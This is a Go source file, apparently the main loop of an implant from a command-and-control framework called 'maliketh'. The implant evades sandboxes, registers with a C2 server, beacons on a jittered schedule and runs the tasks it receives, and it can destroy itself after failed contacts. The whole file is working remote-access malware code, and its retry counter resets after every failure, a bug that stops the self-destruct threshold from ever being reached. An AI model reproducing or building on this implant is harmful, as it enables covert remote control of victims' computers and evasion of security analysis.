package main

import (
	"fmt"
	config "maliketh/pkg/config"
	"maliketh/pkg/crypto"
	"maliketh/pkg/implant"
	"maliketh/pkg/sandbox"
	. "maliketh/pkg/utils"
	"os"
	"time"
)

func main() {

	if !config.DEBUG {
		if sandbox.SandboxAll() {
			DebugPrintln("Sandbox detected, exiting...")
			return
		}
	}

	public, private, err := crypto.CreateBase64KeyPair()
	if err != nil {
		DebugPrintln("Error creating key pair")
		return
	}

	DebugPrintln(fmt.Sprintf("Public key: %s", public))
	DebugPrintln(fmt.Sprintf("Private key: %s", private))

	// Attempt to register the configured number of times
	for i := 0; i < config.REGISTER_ATTEMPTS; i++ {
		profile, err := implant.Register(config.GetC2Url(), public, private)
		if err != nil {
			DebugPrintln(fmt.Sprintf("Error registering: %s", err))
			if i == config.REGISTER_ATTEMPTS-1 {
				DebugPrintln("Max registration attempts reached, exiting...")
				if config.AUTO_SELF_DESTRUCT {
					implant.SelfDestruct()
				}
				os.Exit(0)
			}
			continue
		}
		config.CurrentProfile = &profile
		break
	}

	failed_checkins := 0
	for {
		time.Sleep(time.Duration(time.Duration(CalculateSleepWithJitter(config.CurrentProfile.Config.Sleep, float32(config.CurrentProfile.Config.Jitter))) * time.Second))
		task, err := implant.Checkin(config.GetC2Url(), *config.CurrentProfile)
		if err != nil {
			failed_checkins++
			if failed_checkins == config.CurrentProfile.Config.MaxRetries && config.AUTO_SELF_DESTRUCT {
				DebugPrintln("Max failed checkins reached, exiting...")
				implant.SelfDestruct()
			}
		}
		failed_checkins = 0

		go implant.Handle(config.GetC2Url(), task, *config.CurrentProfile)
	}
}
